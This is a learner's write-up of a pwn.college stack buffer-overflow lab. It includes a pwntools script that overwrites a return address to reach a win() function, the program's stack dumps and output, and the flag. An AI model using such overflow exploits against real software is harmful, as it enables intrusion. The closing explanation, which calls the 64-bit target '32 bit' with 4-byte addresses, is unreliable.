# Level 3.0

Okay so I opened the challenge and saw the following text:

`You will want to overwrite the return value from challenge()
(located at 0x7ffdf0ad4af8, 136 bytes past the start of the input buffer)
with 0x4018d2, which is the address of the win() function.
This will cause challenge() to return directly into the win() function,
which will in turn give you the flag.`


`You will want to overwrite the return value from challenge()
(located at 0x7ffe8fc04508, 136 bytes past the start of the input buffer)
with 0x4018d2.`

So we've been given the info that we need to overwrite 136 bytes and above that we've been told what the return value should be set to be instead of the win variable.

So this is the script I came up with this script:

```py
from pwn import *

p = process('/challenge/babymem-level-3-0')
p.sendline(b"250")
payload = b"a"*136 + b"\xd2\x18\x40\x00"
p.send(payload)
p.interactive()
```

```
hacker@memory-errors~level3-0:~$ python3 script.py
[+] Starting local process '/challenge/babymem-level-3-0': pid 193
[*] Switching to interactive mode
[*] Process '/challenge/babymem-level-3-0' stopped with exit code -11 (SIGSEGV) (pid 193)
###
### Welcome to /challenge/babymem-level-3-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe8fc04450 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffe8fc04458 (rsp+0x0008) | 38 56 c0 8f fe 7f 00 00 | 0x00007ffe8fc05638 |
| 0x00007ffe8fc04460 (rsp+0x0010) | 28 56 c0 8f fe 7f 00 00 | 0x00007ffe8fc05628 |
| 0x00007ffe8fc04468 (rsp+0x0018) | 23 c7 da 54 01 00 00 00 | 0x0000000154dac723 |
| 0x00007ffe8fc04470 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffe8fc04478 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe8fc04480 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe8fc04488 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe8fc04490 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe8fc04498 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe8fc044a0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe8fc044a8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe8fc044b0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe8fc044b8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe8fc044c0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe8fc044c8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe8fc044d0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe8fc044d8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe8fc044e0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe8fc044e8 (rsp+0x0098) | 50 20 40 00 00 00 00 00 | 0x0000000000402050 |
| 0x00007ffe8fc044f0 (rsp+0x00a0) | 30 55 c0 8f fe 7f 00 00 | 0x00007ffe8fc05530 |
| 0x00007ffe8fc044f8 (rsp+0x00a8) | 80 44 c0 8f fe 7f 00 00 | 0x00007ffe8fc04480 |
| 0x00007ffe8fc04500 (rsp+0x00b0) | 30 55 c0 8f fe 7f 00 00 | 0x00007ffe8fc05530 |
| 0x00007ffe8fc04508 (rsp+0x00b8) | 37 20 40 00 00 00 00 00 | 0x0000000000402037 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffe8fc04450, and our base pointer points to 0x7ffe8fc04500.
This means that we have (decimal) 24 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 192 bytes.
The input buffer begins at 0x7ffe8fc04480, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 104 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffe8fc04508, 136 bytes after the start of your input buffer.
That means that you will need to input at least 144 bytes (104 to fill the buffer,
32 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

Payload size: You have chosen to send 200 bytes of input!
This will allow you to write from 0x7ffe8fc04480 (the start of the input buffer)
right up to (but not including) 0x7ffe8fc04548 (which is 96 bytes beyond the end of the buffer).
Of these, you will overwrite 64 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

You will want to overwrite the return value from challenge()
(located at 0x7ffe8fc04508, 136 bytes past the start of the input buffer)
with 0x4018d2, which is the address of the win() function.
This will cause challenge() to return directly into the win() function,
which will in turn give you the flag.
Keep in mind that you will need to write the address of the win() function
in little-endian (bytes backwards) so that it is interpreted properly.

Send your payload (up to 200 bytes)!
You sent 140 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe8fc04450 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffe8fc04458 (rsp+0x0008) | 38 56 c0 8f fe 7f 00 00 | 0x00007ffe8fc05638 |
| 0x00007ffe8fc04460 (rsp+0x0010) | 28 56 c0 8f fe 7f 00 00 | 0x00007ffe8fc05628 |
| 0x00007ffe8fc04468 (rsp+0x0018) | 23 c7 da 54 01 00 00 00 | 0x0000000154dac723 |
| 0x00007ffe8fc04470 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffe8fc04478 (rsp+0x0028) | c8 00 00 00 00 00 00 00 | 0x00000000000000c8 |
| 0x00007ffe8fc04480 (rsp+0x0030) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc04488 (rsp+0x0038) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc04490 (rsp+0x0040) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc04498 (rsp+0x0048) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc044a0 (rsp+0x0050) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc044a8 (rsp+0x0058) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc044b0 (rsp+0x0060) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc044b8 (rsp+0x0068) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc044c0 (rsp+0x0070) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc044c8 (rsp+0x0078) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc044d0 (rsp+0x0080) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc044d8 (rsp+0x0088) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc044e0 (rsp+0x0090) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc044e8 (rsp+0x0098) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc044f0 (rsp+0x00a0) | 61 61 61 61 8c 00 00 00 | 0x0000008c61616161 |
| 0x00007ffe8fc044f8 (rsp+0x00a8) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc04500 (rsp+0x00b0) | 61 61 61 61 61 61 61 61 | 0x6161616161616161 |
| 0x00007ffe8fc04508 (rsp+0x00b8) | d2 18 40 00 00 00 00 00 | 0x00000000004018d2 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x6161616161616161
- the saved frame pointer (of main) is at 0x7ffe8fc04500
- the saved return address (previously to main) is at 0x7ffe8fc04508
- the saved return address is now pointing to 0x4018d2.
- the address of win() is 0x4018d2.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win() when it returns.
Let's try it now!

Goodbye!
You win! Here is your flag:
pwn.college{04wbml3qC1uOaKGtmqx3aPk5yv5.01M5IDLzITO0czW}
```

From this I got the flag

## Mistakes I made

1. Overwritten the return value with wrong little endian format i.e "\xd2\x18\x40". We add an extra "\x00" because this is a 32 bit architecture where addresses are 4 bytes long and the earlier one was only 3 bytes.

## Flag

`pwn.college{04wbml3qC1uOaKGtmqx3aPk5yv5.01M5IDLzITO0czW}`



